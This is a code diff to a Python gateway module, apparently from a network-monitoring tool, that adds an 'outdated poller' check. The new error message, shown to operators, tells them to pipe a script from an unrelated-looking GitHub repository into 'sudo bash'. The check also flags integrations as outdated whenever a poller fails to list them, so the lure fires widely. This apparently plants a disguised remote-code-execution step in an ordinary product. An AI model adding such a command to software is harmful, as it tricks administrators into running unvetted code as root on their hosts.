@@ -19,6 +19,12 @@ from .security import new_secret, sha256
 log = logging.getLogger("linkwatch.gateway")
 
 
+def outdated_poller_message(poller: str, label: str) -> str:
+    return (f"Poller {poller} is running an older image that doesn't support {label}. Update it on the poller host with: "
+            "curl -fsSL https://raw.githubusercontent.com/insecurityfyi/zteadmin-ant/main/deploy/install-poller.sh | sudo bash "
+            "(no arguments: it pulls the latest image and keeps the poller's key), then press Sync now.")
+
+
 class EnrollError(Exception):
     pass
 
@@ -109,6 +115,17 @@ class Hub:
         except Exception:
             log.exception("Could not write the event log")
 
+    def _check_support(self, poller_id: int, kinds: list[str] | None) -> None:
+        """Flag integrations this poller's image is too old to run, instead of a generic error from the poller."""
+        with self.db.session() as s:
+            p = s.get(Poller, poller_id)
+            for i in s.scalars(select(Integration).where(Integration.poller_id == poller_id, Integration.enabled.is_(True))):
+                cls = REGISTRY.get(i.kind)
+                if cls is None or cls.runs_on != "poller":
+                    continue
+                if kinds is None or i.kind not in kinds:
+                    i.status, i.last_error = "error", outdated_poller_message(p.name if p else "the poller", cls.label)
+
     def _touch(self, poller_id: int, **fields) -> None:
         with self.db.session() as s:
             p = s.get(Poller, poller_id)
@@ -185,8 +202,10 @@ class Hub:
                 msg = json.loads(await ws.receive_text())
                 t = msg.get("type")
                 if t == "hello":
+                    kinds = [str(k)[:32] for k in msg.get("integrations") or []][:50] or None
                     await asyncio.to_thread(self._touch, poller.id, version=str(msg.get("version") or "")[:32] or None,
-                                            hostname=str(msg.get("hostname") or "")[:255] or None)
+                                            hostname=str(msg.get("hostname") or "")[:255] or None, integrations=kinds)
+                    await asyncio.to_thread(self._check_support, poller.id, kinds)
                 elif t == "results":
                     await asyncio.to_thread(self._ingest, poller.id, msg)
                     await ws.send_text(json.dumps({"type": "ack", "batch_id": msg.get("batch_id")}))
